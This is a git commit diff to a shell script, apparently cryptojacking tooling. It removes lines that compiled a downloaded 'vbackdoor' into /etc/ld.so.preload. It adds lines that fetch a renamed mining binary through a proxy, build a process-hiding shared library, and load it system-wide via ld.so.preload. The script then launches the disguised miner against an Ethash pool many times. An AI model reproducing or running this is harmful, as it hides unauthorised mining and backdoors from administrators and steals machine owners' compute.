84acc742719d5f57879c89164189b20b8f3cbafb
lafixas2 <106418284+lafixas2@users.noreply.github.com>
2022-05-28 04:40:00 +0000

    Update 13.sh

--- 13.sh
+++ 13.sh
@@ -1,14 +1,3 @@
-apt update && sudo apt-get --purge remove "*nvidia*" && sudo apt-get install nvidia-driver-460
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-
-
-
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -41,15 +30,47 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar -xf lolMiner_v1.29_Lin64.tar.gz
-chmod +x 1.29
-ph add lolminer
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
-vi vbackdoor.c
-gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
-sudo mv vbackdoor.so /usr/local/lib/
-echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800  --user teguhcong.20saja-$(echo $(shuf -i 1-99 -n 1)) --ethstratum ETHPROXY
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://teguhcong.RDP@ethash.poolbinance.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+sleep 1m
